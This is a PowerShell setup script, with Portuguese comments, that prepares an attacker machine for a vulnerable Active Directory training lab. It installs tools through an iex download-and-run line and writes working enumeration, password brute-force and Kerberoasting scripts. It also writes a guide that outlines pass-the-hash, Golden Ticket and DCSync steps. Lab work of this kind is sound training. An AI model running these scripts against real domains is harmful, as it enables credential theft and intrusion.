# Script de Configuração da Máquina Atacante
# Autor: Lab Vuln
# Versão: 1.0

# Configurações
$TargetDomain = "vulnlab.local"
$TargetIP = "192.168.1.10"  # IP do DC
$AttackerIP = "192.168.1.20"  # IP da máquina atacante

function Write-ColorOutput {
    param([string]$Message, [string]$Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

function Install-AttackTools {
    Write-ColorOutput "=== INSTALANDO FERRAMENTAS DE ATAQUE ===" "Blue"
    
    try {
        # Criar diretório de ferramentas
        $ToolsDir = "C:\PentestTools"
        New-Item -ItemType Directory -Path $ToolsDir -Force
        
        # Instalar Chocolatey se não estiver instalado
        if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
            Write-ColorOutput "Instalando Chocolatey..." "Yellow"
            Set-ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
        }
        
        # Instalar ferramentas via Chocolatey
        Write-ColorOutput "Instalando ferramentas de pentest..." "Yellow"
        choco install nmap -y
        choco install wireshark -y
        choco install putty -y
        choco install winpcap -y
        
        Write-ColorOutput "Ferramentas instaladas via Chocolatey!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Erro ao instalar ferramentas: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Download-AttackScripts {
    Write-ColorOutput "=== BAIXANDO SCRIPTS DE ATAQUE ===" "Blue"
    
    try {
        $ScriptsDir = "C:\PentestTools\Scripts"
        New-Item -ItemType Directory -Path $ScriptsDir -Force
        
        # Script de enumeração
        $EnumScript = @"
# Script de Enumeração AD
Write-Host "=== ENUMERAÇÃO DO ACTIVE DIRECTORY ===" -ForegroundColor Green

# Configurações
`$Domain = "$TargetDomain"
`$DC = "$TargetIP"

Write-Host "1. Enumeração de usuários..." -ForegroundColor Yellow
net user /domain

Write-Host "`n2. Enumeração de grupos..." -ForegroundColor Yellow
net group /domain

Write-Host "`n3. Enumeração de computadores..." -ForegroundColor Yellow
net view /domain

Write-Host "`n4. Teste de conectividade..." -ForegroundColor Yellow
Test-NetConnection -ComputerName `$DC -Port 389
Test-NetConnection -ComputerName `$DC -Port 445
Test-NetConnection -ComputerName `$DC -Port 88

Write-Host "`n5. Enumeração via LDAP..." -ForegroundColor Yellow
dsquery user -domain `$Domain
dsquery group -domain `$Domain
dsquery computer -domain `$Domain

Write-Host "`nEnumeração concluída!" -ForegroundColor Green
"@
        
        Set-Content -Path "$ScriptsDir\enumeration.ps1" -Value $EnumScript
        
        # Script de força bruta
        $BruteScript = @"
# Script de Força Bruta
Write-Host "=== FORÇA BRUTA DE SENHAS ===" -ForegroundColor Green

# Lista de usuários para testar
`$Users = @("admin", "user1", "test", "guest", "admin2", "service", "backup", "webadmin")

# Lista de senhas comuns
`$Passwords = @("admin123", "password", "test123", "guest", "admin", "service123", "backup", "web123", "123456", "password123")

Write-Host "Testando credenciais..." -ForegroundColor Yellow

foreach (`$user in `$Users) {
    foreach (`$pass in `$Passwords) {
        try {
            `$cred = New-Object System.Management.Automation.PSCredential(`$user, (ConvertTo-SecureString `$pass -AsPlainText -Force))
            `$result = Invoke-Command -ComputerName "$TargetIP" -Credential `$cred -ScriptBlock { whoami } -ErrorAction SilentlyContinue
            
            if (`$result) {
                Write-Host "SUCESSO: `$user:`$pass" -ForegroundColor Green
            }
        }
        catch {
            # Credencial inválida
        }
    }
}

Write-Host "Força bruta concluída!" -ForegroundColor Green
"@
        
        Set-Content -Path "$ScriptsDir\bruteforce.ps1" -Value $BruteScript
        
        # Script de Kerberoasting
        $KerberoastScript = @"
# Script de Kerberoasting
Write-Host "=== KERBEROASTING ===" -ForegroundColor Green

# Usar PowerSploit (se instalado)
if (Get-Module -ListAvailable -Name PowerSploit) {
    Import-Module PowerSploit
    Invoke-Kerberoast -OutputFormat Hashcat | Out-File -FilePath "C:\PentestTools\kerberoast_hashes.txt"
    Write-Host "Hashes salvos em C:\PentestTools\kerberoast_hashes.txt" -ForegroundColor Green
} else {
    Write-Host "PowerSploit não encontrado. Instale manualmente." -ForegroundColor Yellow
}

Write-Host "Kerberoasting concluído!" -ForegroundColor Green
"@
        
        Set-Content -Path "$ScriptsDir\kerberoasting.ps1" -Value $KerberoastScript
        
        Write-ColorOutput "Scripts de ataque criados em C:\PentestTools\Scripts" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Erro ao criar scripts: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Configure-Network {
    Write-ColorOutput "=== CONFIGURANDO REDE ===" "Blue"
    
    try {
        # Configurar IP estático se necessário
        Write-ColorOutput "Configurando rede para ataque..." "Yellow"
        
        # Adicionar entrada no hosts file
        $HostsEntry = "$TargetIP $TargetDomain"
        $HostsFile = "C:\Windows\System32\drivers\etc\hosts"
        
        if (!(Select-String -Path $HostsFile -Pattern $TargetDomain -Quiet)) {
            Add-Content -Path $HostsFile -Value "`n$HostsEntry"
            Write-ColorOutput "Entrada adicionada ao arquivo hosts" "Green"
        }
        
        # Testar conectividade
        Write-ColorOutput "Testando conectividade com o DC..." "Yellow"
        if (Test-Connection -ComputerName $TargetIP -Count 1 -Quiet) {
            Write-ColorOutput "Conectividade OK!" "Green"
        } else {
            Write-ColorOutput "Problema de conectividade!" "Red"
        }
        
        return $true
    }
    catch {
        Write-ColorOutput "Erro ao configurar rede: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Create-AttackGuide {
    Write-ColorOutput "=== CRIANDO GUIA DE ATAQUE ===" "Blue"
    
    try {
        $GuideContent = @"
# GUIA DE ATAQUE - LABORATÓRIO AD VULNERÁVEL

## Configurações
- Alvo: $TargetDomain ($TargetIP)
- Atacante: $AttackerIP

## Ferramentas Instaladas
- Nmap (enumeração de portas)
- Wireshark (análise de tráfego)
- PuTTY (conexões SSH/Telnet)
- WinPcap (captura de pacotes)

## Scripts Disponíveis
- C:\PentestTools\Scripts\enumeration.ps1
- C:\PentestTools\Scripts\bruteforce.ps1
- C:\PentestTools\Scripts\kerberoasting.ps1

## Metodologia de Ataque

### 1. Reconhecimento
- Enumeração de portas: nmap -sS -sV $TargetIP
- Enumeração de usuários: .\enumeration.ps1
- Análise de tráfego: Wireshark

### 2. Enumeração AD
- Usuários: net user /domain
- Grupos: net group /domain
- Computadores: net view /domain
- LDAP: dsquery user -domain $TargetDomain

### 3. Força Bruta
- Executar: .\bruteforce.ps1
- Usuários: admin, user1, test, guest, admin2, service, backup, webadmin
- Senhas: admin123, password, test123, guest, admin, service123, backup, web123

### 4. Kerberoasting
- Executar: .\kerberoasting.ps1
- Extrair TGS tickets
- Crackear hashes offline

### 5. Pass-the-Hash
- Usar credenciais obtidas
- Mimikatz para extração
- Lateral movement

### 6. Privilege Escalation
- Golden Ticket
- Silver Ticket
- DCSync
- Admin to Domain Admin

## Comandos Úteis

### Enumeração
- net user /domain
- net group /domain
- net view /domain
- dsquery user -domain $TargetDomain
- nltest /domain_trusts

### Autenticação
- Test-NetConnection -ComputerName $TargetIP -Port 445
- Test-NetConnection -ComputerName $TargetIP -Port 389
- Test-NetConnection -ComputerName $TargetIP -Port 88

### Ferramentas Externas
- Mimikatz (extração de credenciais)
- PowerSploit (PowerShell attacks)
- BloodHound (mapeamento de AD)
- CrackMapExec (enumeração)
- Responder (LLMNR/NBT-NS poisoning)

## Cenários de Ataque

### Cenário 1: Enumeração Básica
1. Executar enumeration.ps1
2. Identificar usuários e grupos
3. Mapear estrutura do AD

### Cenário 2: Força Bruta
1. Executar bruteforce.ps1
2. Identificar credenciais válidas
3. Acessar recursos

### Cenário 3: Kerberoasting
1. Executar kerberoasting.ps1
2. Extrair TGS tickets
3. Crackear hashes

### Cenário 4: Pass-the-Hash
1. Usar credenciais obtidas
2. Mimikatz para extração
3. Lateral movement

### Cenário 5: Privilege Escalation
1. Golden Ticket attack
2. DCSync attack
3. Domain compromise

## Segurança
⚠️ ATENÇÃO: Use apenas em ambiente isolado!
- Não conecte à internet
- Não use credenciais reais
- Documente todas as atividades
- Destrua após uso

Criado em: $(Get-Date)
"@
        
        Set-Content -Path "C:\PentestTools\attack-guide.txt" -Value $GuideContent
        Write-ColorOutput "Guia de ataque criado em C:\PentestTools\attack-guide.txt" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Erro ao criar guia: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Show-Summary {
    Write-ColorOutput "`n=== RESUMO DA CONFIGURAÇÃO ===" "Blue"
    Write-ColorOutput "✅ Ferramentas de ataque instaladas" "Green"
    Write-ColorOutput "✅ Scripts de ataque criados" "Green"
    Write-ColorOutput "✅ Rede configurada" "Green"
    Write-ColorOutput "✅ Guia de ataque criado" "Green"
    
    Write-ColorOutput "`n=== INFORMAÇÕES IMPORTANTES ===" "Yellow"
    Write-ColorOutput "Alvo: $TargetDomain ($TargetIP)" "Yellow"
    Write-ColorOutput "Atacante: $AttackerIP" "Yellow"
    Write-ColorOutput "Ferramentas: C:\PentestTools" "Yellow"
    Write-ColorOutput "Scripts: C:\PentestTools\Scripts" "Yellow"
    Write-ColorOutput "Guia: C:\PentestTools\attack-guide.txt" "Yellow"
    
    Write-ColorOutput "`n=== PRÓXIMOS PASSOS ===" "Blue"
    Write-ColorOutput "1. Verificar conectividade com o DC" "Yellow"
    Write-ColorOutput "2. Executar scripts de enumeração" "Yellow"
    Write-ColorOutput "3. Iniciar ataques de força bruta" "Yellow"
    Write-ColorOutput "4. Realizar Kerberoasting" "Yellow"
    Write-ColorOutput "5. Documentar descobertas" "Yellow"
    
    Write-ColorOutput "`n🎯 MÁQUINA ATACANTE CONFIGURADA COM SUCESSO! 🎯" "Green"
}

# FUNÇÃO PRINCIPAL
function Setup-AttackerMachine {
    Write-ColorOutput "=== CONFIGURADOR DE MÁQUINA ATACANTE ===" "Blue"
    Write-ColorOutput "Lab Vuln - Ambiente de Segurança" "Blue"
    Write-ColorOutput "Versão: 1.0" "Blue"
    Write-ColorOutput "Data: $(Get-Date)" "Blue"
    
    # Verificar se é administrador
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    if (!$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-ColorOutput "ERRO: Este script deve ser executado como Administrador!" "Red"
        return
    }
    
    Write-ColorOutput "`nConfigurando máquina atacante..." "Yellow"
    
    # Executar configuração
    $steps = @(
        @{Name = "Ferramentas de Ataque"; Function = "Install-AttackTools"},
        @{Name = "Scripts de Ataque"; Function = "Download-AttackScripts"},
        @{Name = "Configuração de Rede"; Function = "Configure-Network"},
        @{Name = "Guia de Ataque"; Function = "Create-AttackGuide"}
    )
    
    foreach ($step in $steps) {
        Write-ColorOutput "`nExecutando: $($step.Name)" "Blue"
        & $step.Function
        
        if ($LASTEXITCODE -ne 0) {
            Write-ColorOutput "Erro na etapa: $($step.Name)" "Red"
            return
        }
    }
    
    Show-Summary
}

# Executar configuração
Setup-AttackerMachine 